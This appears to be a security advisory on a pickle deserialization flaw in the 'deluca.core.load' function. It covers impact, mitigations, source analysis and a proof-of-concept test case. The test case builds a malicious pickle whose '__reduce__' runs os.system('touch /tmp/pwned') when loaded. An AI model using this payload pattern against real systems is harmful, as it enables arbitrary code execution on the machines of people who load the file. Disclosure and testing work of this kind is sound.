- Vulnerability Name: Pickle Deserialization Vulnerability in Model Loading
- Description:
    - The `deluca.core.load` function is used to load Python objects from files. This function utilizes the `pickle.load` method from Python's `pickle` library.
    - An attacker can create a malicious file containing a pickled Python object.
    - This malicious pickled object can be designed to execute arbitrary code when it is deserialized using `pickle.load`.
    - If a user loads a model or data from an untrusted source using `deluca.core.load` and that source has been compromised or is malicious, the attacker's code will be executed on the user's system.
- Impact:
    - **Critical:** Remote Code Execution (RCE). Successful exploitation of this vulnerability allows an attacker to execute arbitrary Python code on the machine of a user who loads the malicious file. This can lead to complete system compromise, data theft, malware installation, or any other malicious action the attacker desires.
- Vulnerability Rank: critical
- Currently Implemented Mitigations:
    - None. The codebase directly employs `pickle.load` without any input validation, sanitization, or security measures to prevent deserialization of malicious data.
- Missing Mitigations:
    - **Replace `pickle` with a safer serialization format:** The most effective mitigation is to avoid using `pickle` for loading models or data from potentially untrusted sources. Consider using safer alternatives like:
        - **JSON:** Suitable for simple data structures and widely supported, but may not be adequate for complex Python objects.
        - **Protocol Buffers (protobuf):** A language-neutral, platform-neutral, extensible mechanism for serializing structured data. More robust and efficient than pickle, and designed with security in mind.
        - **MessagePack:** An efficient binary serialization format, also safer than pickle.
    - **Input Validation and Sanitization (If `pickle` must be used):** If replacing `pickle` is not feasible, rigorous input validation is crucial. However, this approach is generally discouraged for `pickle` due to its inherent insecurity:
        - **Verify the source of the file:** Ensure that files loaded using `deluca.core.load` originate from trusted sources only.
        - **Implement integrity checks:** Use cryptographic hashes to verify the integrity of the pickled file before loading.
        - **Restrict file access:** Limit the file system permissions of the application using `deluca.core.load` to minimize potential damage from malicious code execution.
    - **Sandboxing or Isolation (If `pickle` must be used):**  Execute `deluca.core.load` within a sandboxed or isolated environment. This can limit the damage if malicious code is executed, as the sandbox can restrict access to sensitive system resources and functionalities.
- Preconditions:
    - The attacker must be able to create a malicious pickled file.
    - A user must execute code that uses `deluca.core.load` to load this malicious file. This could occur if a user downloads a model from an untrusted source or if an attacker can somehow replace a legitimate model file with a malicious one.
- Source Code Analysis:
    - File: `/code/deluca/core.py`
    - Function: `load(path)`
    ```python
    import pickle

    def load(path):
      return pickle.load(open(path, "rb"))
    ```
    - The `load` function opens the file specified by `path` in binary read mode (`"rb"`) and directly passes the file object to `pickle.load()`.
    - `pickle.load()` deserializes the byte stream from the file and reconstructs Python objects in memory.
    - The `pickle` protocol is known to be vulnerable to arbitrary code execution because the pickled data can contain instructions for building arbitrary Python objects, including those that execute system commands or other malicious operations during the deserialization process.
    - There are no checks on the file's content or origin before `pickle.load()` is called, making the system vulnerable to loading malicious pickled files.

- Security Test Case:
    - Step 1: Create a malicious pickled file named `malicious_model.pkl`. This file will contain a pickled object that executes a system command when loaded.
        ```python
        import pickle
        import os

        class MaliciousModel:
            def __reduce__(self):
                # This command will create a file named 'pwned' in the /tmp directory
                return (os.system, ('touch /tmp/pwned',))

        malicious_model = MaliciousModel()
        with open('malicious_model.pkl', 'wb') as f:
            pickle.dump(malicious_model, f)
        ```
    - Step 2: Create a Python script `load_model.py` that uses `deluca.core.load` to load the `malicious_model.pkl` file.
        ```python
        from deluca.core import load

        model = load('malicious_model.pkl')
        print("Model loaded (or attempted to be loaded). Check for /tmp/pwned.")
        ```
    - Step 3: Run `load_model.py`.
        ```bash
        python load_model.py
        ```
    - Step 4: Check for successful exploitation. After running `load_model.py`, verify if the file `/tmp/pwned` has been created.
        ```bash
        ls /tmp/pwned
        ```
        - If the file `/tmp/pwned` exists, it indicates that the malicious code within `malicious_model.pkl` was successfully executed when `pickle.load` was called by `deluca.core.load`, confirming the vulnerability. If the command `ls /tmp/pwned` returns "ls: cannot access '/tmp/pwned': No such file or directory", then the vulnerability was not successfully exploited in this test environment. However, in a vulnerable environment, the file `/tmp/pwned` should be created.
